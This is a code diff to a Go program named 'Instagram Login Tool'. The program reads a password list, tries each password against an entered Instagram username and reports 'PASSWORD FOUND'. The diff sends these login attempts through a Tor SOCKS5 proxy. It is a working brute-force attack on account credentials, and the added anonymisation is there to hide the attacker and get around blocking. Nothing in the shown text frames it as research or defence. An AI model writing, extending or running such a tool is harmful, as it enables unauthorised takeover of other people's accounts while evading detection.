@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/json"
 	"fmt"
+	"golang.org/x/net/proxy"
 	"io/ioutil"
 	"log"
 	"math/rand"
@@ -20,6 +21,8 @@ const (
 	TIMEOUT      = 10 * time.Second
 	CURRENT_TIME = "2025-05-24 12:27:06"
 	CURRENT_USER = "monsmain"
+	// اگر Tor Browser داری، پورت رو بذار 9150
+	TOR_PROXY    = "127.0.0.1:9050"
 )
 
 type InstagramResponse struct {
@@ -39,9 +42,9 @@ func main() {
 		defer logFile.Close()
 	}
 
-	fmt.Println("=== Instagram Login Tool ===")
+	fmt.Println("=== Instagram Login Tool (via Tor) ===")
 	fmt.Printf("Time: %s\n", CURRENT_TIME)
-	fmt.Printf("Developer: %s\n\n", CURRENT_USER)
+	fmt.Printf("User: %s\n\n", CURRENT_USER)
 
 	var username string
 	fmt.Print("Enter Instagram username: ")
@@ -54,12 +57,12 @@ func main() {
 	}
 
 	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
-	fmt.Println("\nStarting login attempts...\n")
+	fmt.Println("\nStarting login attempts (using Tor)...\n")
 
 	for i, password := range passwords {
 		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
 
-		success, response := tryLogin(username, password)
+		success, response := tryLoginTor(username, password)
 
 		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
 			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
@@ -79,14 +82,17 @@ func main() {
 	saveResult(username, "", false)
 }
 
-func getHttpClient() *http.Client {
-	return &http.Client{
-		Timeout: TIMEOUT,
+func getTorClient() *http.Client {
+	dialer, err := proxy.SOCKS5("tcp", TOR_PROXY, nil, proxy.Direct)
+	if err != nil {
+		log.Fatalf("Failed to obtain Tor proxy: %v", err)
 	}
+	transport := &http.Transport{Dial: dialer.Dial}
+	return &http.Client{Transport: transport, Timeout: TIMEOUT}
 }
 
-func tryLogin(username, password string) (bool, InstagramResponse) {
-	client := getHttpClient()
+func tryLoginTor(username, password string) (bool, InstagramResponse) {
+	client := getTorClient()
 
 	loginUrl := API_URL + "accounts/login/"
 
